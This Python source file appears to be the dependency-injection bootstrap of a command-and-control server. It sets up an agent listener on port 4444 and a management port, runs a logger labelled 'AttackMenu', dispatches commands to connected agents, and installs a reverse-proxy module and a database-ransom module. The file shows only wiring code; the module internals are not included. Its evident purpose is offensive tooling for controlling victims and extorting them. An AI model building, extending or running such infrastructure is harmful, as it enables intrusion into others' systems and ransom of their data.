from typing import Any, Callable, Dict
from infra.utils.Logger import Logger
from infra.services.ConnectionService import ConnectionService
from infra.controllers.ClientController import ClientController
from infra.database.InMemoryDb import InMemoryDatabase
from infra.server.WsServer import WsServer
from application.client.use_cases.DispatchCommand import DispatchCommandUseCase


class AppModule:

    def __init__(
        self,
        debug: bool = False,
        management_port: int = 4445,
        agent_port: int = 4444,
    ) -> None:
        self._debug           = debug
        self._management_port = management_port
        self._agent_port      = agent_port
        self._singletons: Dict[str, Any]                        = {}
        self._factories:  Dict[str, Callable[["AppModule"], Any]] = {}
        self._bootstrap()

    def _bootstrap(self) -> None:
        self._register_infra()
        self._register_services()
        self._register_controllers()
        self._register_use_cases()
        self._register_modules()
        self._register_server()

    def _register_infra(self) -> None:
        self._register("logger",   lambda c: Logger(context="AttackMenu", debug=c._debug))
        self._register("database", lambda c: InMemoryDatabase())

    def _register_services(self) -> None:
        self._register(
            "connection_service",
            lambda c: ConnectionService(logger=c.resolve("logger")),
        )

    def _register_controllers(self) -> None:
        self._register(
            "client_controller",
            lambda c: ClientController(
                connection_service=c.resolve("connection_service"),
                logger=c.resolve("logger"),
            ),
        )

    def _register_use_cases(self) -> None:
        self._register("dispatcher", lambda c: self._build_dispatcher(c))

    def _register_modules(self) -> None:
        from infra.modules.ProxyReverseModule import ProxyReverseModule
        from infra.modules.RansomDbModule import RansomDbModule

        connection_service = self.resolve("connection_service")
        dispatcher = self.resolve("dispatcher")

        proxy_module = ProxyReverseModule(broadcast=connection_service.broadcast_to_clients)
        proxy_module.install(dispatcher)

        ransom_db_module = RansomDbModule(broadcast=connection_service.broadcast_to_clients)
        ransom_db_module.install(dispatcher)

    def _register_server(self) -> None:
        self._register(
            "ws_server",
            lambda c: WsServer(
                dispatcher=c.resolve("dispatcher"),
                connection_service=c.resolve("connection_service"),
                logger=c.resolve("logger"),
                management_port=self._management_port,
                agent_port=self._agent_port,
            ),
        )

    def _build_dispatcher(self, c: "AppModule") -> DispatchCommandUseCase:
        dispatcher = DispatchCommandUseCase()
        for action, handler in c.resolve("client_controller").get_actions().items():
            dispatcher.register(action, handler)
        return dispatcher

    def _register(self, key: str, factory: Callable[["AppModule"], Any]) -> None:
        self._factories[key] = factory

    def resolve(self, key: str) -> Any:
        if key not in self._singletons:
            factory = self._factories.get(key)
            if factory is None:
                raise KeyError(f"Dependência '{key}' não registrada no AppModule")
            self._singletons[key] = factory(self)
        return self._singletons[key]

    def get_server(self) -> WsServer:
        return self.resolve("ws_server")
